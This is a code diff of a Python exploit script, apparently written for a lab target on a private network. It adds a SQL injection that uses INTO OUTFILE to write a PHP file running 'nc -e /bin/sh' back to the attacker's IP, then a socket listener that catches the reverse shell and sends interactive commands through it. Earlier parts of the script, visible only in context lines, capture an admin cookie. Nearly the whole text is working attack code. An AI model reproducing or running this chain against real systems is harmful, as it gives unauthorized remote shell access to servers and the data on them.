@@ -14,6 +14,7 @@ import logging
 import requests
 import sys
 import random
+import socket
 
 
 # Class S to server as the http server handler to receive the requests with the admin cookie.
@@ -86,13 +87,52 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
         sys.exit("2. Admin Cookie Capture: Didn't work...Exiting :(")
 
     # 3. Write file to server disk for shell access.
-    ## Having a tough time with the URL enconding (I think) on the exploit payload.....
-    random_number = random.randint(0,10)
-    logging.info("3. Reverse Shell: Random number is %s", str(random_number))
-    response = requests.get('http://192.168.0.228/admin/edit.php?id=0%20union%20select%201,%22script%20ran%20wellhhhh%22,3,4%20into%20outfile%20%22/var/www/css/proof2.txt%22')
-    print(response.status_code)
-    response = requests.get('http://192.168.0.228/css/proof2.txt')
-    logging.info(response.content)
+    ## Generate random number to make each request (likely) unique.
+    random_number = random.randint(0,100)
+    logging.info("3. Reverse Shell: Writing reverse shell payload to server...")
+    response = requests.get('http://192.168.0.228/admin/edit.php?id=0 union select 1,"<?php exec(\'nc -e /bin/sh 192.168.0.102 9001\')?>",3,4 into outfile "/var/www/css/proof_'+str(random_number)+'.php"', cookies=cookies, verify=False)
+    logging.info(response.request.url)
+    ## Confirm that the file has been written to disk.
+    response = requests.get('http://192.168.0.228/css/')
+    if "proof_"+str(random_number)+".php" in str(response.content):
+        logging.info("3. Reverse Shell: Confirmed reverse shell payload written to server!\n")
+    else:
+        sys.exit("3. Reverse Shell: Didn't work...Exiting :(")
+
+    # 4. Reverse Shell Listener
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
+
+    s.bind(("192.168.0.102", 9001)) # define the kali IP and the listening port
+    s.listen(1) # define the backlog size, since we are expecting a single connection from a single
+                                                            # target we will listen to one connection
+    logging.info("4. Reverse Shell Command: Listening...")
+
+    # response = requests.get('http://192.168.0.228/css/proof_'+str(random_number)+'.php')
+
+    conn, addr = s.accept() # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
+                                # port in a tuple format (IP,port)
+
+    logging.info("4. Reverse Shell Command: We got a connection!")
+
+
+    while True:
+
+        print(f"{addr[0]}:{addr[1]} Connected!")
+        cwd = conn.recv(1024).decode()
+        print("[+] Current working directory:", cwd)
+
+        command = input(f"{cwd} $> ") # Get user input and store it in command variable
+
+        if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
+            conn.send('terminate')
+            conn.close()
+            break
+
+        else:
+            conn.send(command.encode()) # Otherwise we will send the command to the target
+
+            print(conn.recv(1024).decode()) # and print the result that we got back
+
 
 # Main function that runs when executing the script.
 if __name__ == '__main__':
